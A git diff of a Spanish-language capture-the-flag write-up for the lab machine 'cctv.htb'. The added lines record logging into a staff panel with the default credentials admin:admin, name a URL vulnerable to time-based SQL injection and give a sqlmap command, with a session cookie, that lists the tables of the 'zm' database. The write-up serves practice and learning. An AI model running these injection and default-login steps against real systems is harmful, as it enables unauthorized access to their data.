@@ -31,7 +31,13 @@ Encontramos un botón en el cual pone *STAFF Login* accedemos a el encontrando u
 
 Probamos acceder usando `admin::admin` consiguiendo acceder
 
-Al buscar en internet vulnerabilidades sobre esta version vemos alguna imformacion sobre inyeccion de SQL basado en tiempo encontrando una URL en especifico
+Al buscar en internet vulnerabilidades sobre esta versión vemos alguna información sobre inyección de SQL basado en tiempo encontrando una URL en especifico
 ```url
-
+zm/index.php?view=request&request=event&action=removetag&tid=1
 ```
+
+Se lo pasaremos a  [[SQLMAP]] junto con las Cookies de session
+```shell
+sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --dbms=MySQL -D zm --tables --cookie="ZMSESSID=d8r5lphmv7me167dp6hsm1711k" --batch
+```
+
